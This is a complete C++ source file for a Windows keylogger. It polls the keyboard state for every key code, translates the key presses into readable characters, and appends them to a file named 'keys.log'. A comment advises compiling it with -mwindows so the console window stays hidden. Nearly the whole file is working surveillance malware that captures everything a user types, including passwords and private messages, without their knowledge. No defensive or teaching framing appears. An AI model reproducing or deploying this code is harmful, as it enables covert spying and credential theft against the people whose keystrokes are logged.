#include <iostream>
#include <windows.h>
#include <fstream>

#include "vk.h"

// compile with -mwindows to hide console

// a more human readable keylogger
bool clean = true;

bool isShift() { return (((1 << 15 ) & GetAsyncKeyState(VK_LSHIFT)) ? true : false); }

std::string CaptureKeyPress(const int& key, const bool& clean) {
	
	switch (key) {
		
		// letters
		case VK_KEY_A: { return (isShift() ? "A" : "a"); break; }
		case VK_KEY_B: { return (isShift() ? "B" : "b"); break; }
		case VK_KEY_C: { return (isShift() ? "C" : "c"); break; }
		case VK_KEY_D: { return (isShift() ? "D" : "d"); break; }
		case VK_KEY_E: { return (isShift() ? "E" : "e"); break; }
		case VK_KEY_F: { return (isShift() ? "F" : "f"); break; }
		case VK_KEY_G: { return (isShift() ? "G" : "g"); break; }
		case VK_KEY_H: { return (isShift() ? "H" : "h"); break; }
		case VK_KEY_I: { return (isShift() ? "I" : "i"); break; }
		case VK_KEY_J: { return (isShift() ? "J" : "j"); break; }
		case VK_KEY_K: { return (isShift() ? "K" : "k"); break; }
		case VK_KEY_L: { return (isShift() ? "L" : "l"); break; }
		case VK_KEY_M: { return (isShift() ? "M" : "m"); break; }
		case VK_KEY_N: { return (isShift() ? "N" : "n"); break; }
		case VK_KEY_O: { return (isShift() ? "O" : "o"); break; }
		case VK_KEY_P: { return (isShift() ? "P" : "p"); break; }
		case VK_KEY_Q: { return (isShift() ? "Q" : "q"); break; }
		case VK_KEY_R: { return (isShift() ? "R" : "r"); break; }
		case VK_KEY_S: { return (isShift() ? "S" : "s"); break; }
		case VK_KEY_T: { return (isShift() ? "T" : "t"); break; }
		case VK_KEY_U: { return (isShift() ? "U" : "u"); break; }
		case VK_KEY_V: { return (isShift() ? "V" : "v"); break; }
		case VK_KEY_W: { return (isShift() ? "W" : "w"); break; }
		case VK_KEY_X: { return (isShift() ? "X" : "x"); break; }
		case VK_KEY_Y: { return (isShift() ? "Y" : "y"); break; }
		case VK_KEY_Z: { return (isShift() ? "Z" : "z"); break; }
		
		// numbers
		case VK_KEY_1: { return (isShift() ? "!" : "1"); break; }
		case VK_KEY_2: { return (isShift() ? "@" : "2"); break; }
		case VK_KEY_3: { return (isShift() ? "#" : "3"); break; }
		case VK_KEY_4: { return (isShift() ? "$" : "4"); break; }
		case VK_KEY_5: { return (isShift() ? "%" : "5"); break; }
		case VK_KEY_6: { return (isShift() ? "^" : "6"); break; }
		case VK_KEY_7: { return (isShift() ? "&" : "7"); break; }
		case VK_KEY_8: { return (isShift() ? "*" : "8"); break; }
		case VK_KEY_9: { return (isShift() ? "(" : "9"); break; }
		case VK_KEY_0: { return (isShift() ? ")" : "0"); break; } 
		
		case VK_OEM_MINUS: { return (isShift() ? "_" : "-"); break; } 
		case VK_OEM_PLUS:  { return (isShift() ? "+" : "="); break; } 
		
		case VK_OEM_1: { return (isShift() ? ":"  : ";");  break; }
		case VK_OEM_2: { return (isShift() ? "?"  : "/");  break; }
		case VK_OEM_3: { return (isShift() ? "~"  : "`");  break; }
		case VK_OEM_4: { return (isShift() ? "{"  : "[");  break; }
		case VK_OEM_5: { return (isShift() ? "|"  : "\\"); break; }
		case VK_OEM_6: { return (isShift() ? "}"  : "]");  break; }
		case VK_OEM_7: { return (isShift() ? "\"" : "\'"); break; }
		
		//OTHER CHARS
		case VK_OEM_COMMA:  { return (isShift() ? "<" : ","); break; } 
		case VK_OEM_PERIOD: { return (isShift() ? ">" : "."); break; } 
		
		//MAIN
		case VK_ESCAPE: { return "[ESC]"; break; }
		case VK_SPACE:  { return " ";     break; }
		case VK_RETURN: { return (clean ? "\n" : "\\n"); break; }
		case VK_BACK:   { return (clean ? "\b" : "\\b"); break; }
		
		//LOCKS
		case VK_NUMLOCK: { return "[LOCK_NUM]"; break; }
		case VK_SCROLL:  { return "[LOCK_SCR]"; break; }
		case VK_CAPITAL: { return "[LOCK_CAP]"; break; }
		
		//SIDE
		//case VK_SHIFT:  { return std::string("[SHIFT]");  break; }
		//case VK_LSHIFT: { return std::string("[LSHIFT]"); break; }
		//case VK_RSHIFT: { return std::string("[RSHIFT]"); break; }
		
	    case VK_LCONTROL: { return (clean ? "" : "[LCONTROL]"); break; }
		case VK_RCONTROL: { return (clean ? "" : "[RCONTROL]"); break; }
		case VK_TAB:      { return (clean ? "" : "[TAB]"     ); break; }
		case VK_MENU:     { return (clean ? "" : "[ALT]"     ); break; }
		
		case VK_LWIN: { return "[LWIN]"; break; }
		case VK_RWIN: { return "[RWIN]"; break; }
		
		//NUMPAD ON
		case VK_NUMPAD0:  { return "[NUM0]"; break; }
		case VK_NUMPAD1:  { return "[NUM1]"; break; }
		case VK_NUMPAD2:  { return "[NUM2]"; break; }
		case VK_NUMPAD3:  { return "[NUM3]"; break; }
		case VK_NUMPAD4:  { return "[NUM4]"; break; }
		case VK_NUMPAD5:  { return "[NUM5]"; break; }
		case VK_NUMPAD6:  { return "[NUM6]"; break; }
		case VK_NUMPAD7:  { return "[NUM7]"; break; }
		case VK_NUMPAD8:  { return "[NUM8]"; break; }
		case VK_NUMPAD9:  { return "[NUM9]"; break; }
		
		//NUMPAD OFF
		case VK_UP:    { return (clean ? "" : "[ARROW_UP]"   ); break; } 
		case VK_DOWN:  { return (clean ? "" : "[ARROW_DOWN]" ); break; }
		case VK_LEFT:  { return (clean ? "" : "[ARROW_LEFT]" ); break; }
		case VK_RIGHT: { return (clean ? "" : "[ARROW_RIGHT]"); break; }
		case VK_NEXT:  { return (clean ? "" : "[PG_UP]"      ); break; }
		case VK_PRIOR: { return (clean ? "" : "[PG_DOWN]"    ); break; }
		
		case VK_HOME:  { return "[HOME]"; break; }
		case VK_END:   { return "[END]" ; break; }
		
		//NUMPAD EXTRA
		case VK_DIVIDE:   { return std::string("/"); break; }
		case VK_MULTIPLY: { return std::string("*"); break; }
	    case VK_SUBTRACT: { return std::string("-"); break; }
		case VK_ADD:      { return std::string("+"); break; }
		case VK_DECIMAL:  { return std::string("."); break; }
		
		//F1, F2, ...
        case VK_F1:  { return std::string("[F1]");  break; }
        case VK_F2:  { return std::string("[F2]");  break; }
        case VK_F3:  { return std::string("[F3]");  break; }
        case VK_F4:  { return std::string("[F4]");  break; }
        case VK_F5:  { return std::string("[F5]");  break; }
        case VK_F6:  { return std::string("[F6]");  break; }
        case VK_F7:  { return std::string("[F7]");  break; }
        case VK_F8:  { return std::string("[F8]");  break; }
        case VK_F9:  { return std::string("[F9]");  break; }
        case VK_F10: { return std::string("[F10]"); break; }
        case VK_F11: { return std::string("[F11]"); break; }
        case VK_F12: { return std::string("[F12]"); break; }
        case VK_F13: { return std::string("[F13]"); break; }
        case VK_F14: { return std::string("[F14]"); break; }
        case VK_F15: { return std::string("[F15]"); break; }
        case VK_F16: { return std::string("[F16]"); break; }
        case VK_F17: { return std::string("[F17]"); break; }
        case VK_F18: { return std::string("[F18]"); break; }
        case VK_F19: { return std::string("[F19]"); break; }
        case VK_F20: { return std::string("[F20]"); break; }
        case VK_F21: { return std::string("[F21]"); break; }
        case VK_F22: { return std::string("[F22]"); break; }
        case VK_F23: { return std::string("[F23]"); break; }
        case VK_F24: { return std::string("[F24]"); break; }
		
		//OTHER
		case VK_SNAPSHOT: { return std::string("[PrntScr]"); break; }
		case VK_PAUSE:    { return std::string("[PAUSE]"  ); break; }
		case VK_INSERT:   { return std::string("[INSERT]" ); break; }
		case VK_DELETE:   { return std::string("[DELETE]" ); break; }
		case VK_SLEEP:    { return std::string("[SLEEP]"  ); break; }
	}
	
	return std::string("[NULL]");
}

int main(int argc, char* argv[]) {
	
	std::ofstream ofs;
	ofs.open("keys.log", std::ofstream::out | std::ofstream::app);
	
	bool run = true;
	while (run) {
		for (int i = 1; i <= 251; i++) {
			// -32767 = keydown
			// -32768 = keyup
			if (GetAsyncKeyState(i) == -32767) {
				
				std::string key = CaptureKeyPress(i, clean);
				if (key == std::string("[NULL]")) { continue; }
				
				std::cout << key;
				ofs << key;
				ofs.flush();
				
				Sleep(10);
			}
		}
	}
	
	ofs.close();
	
	return 0;
}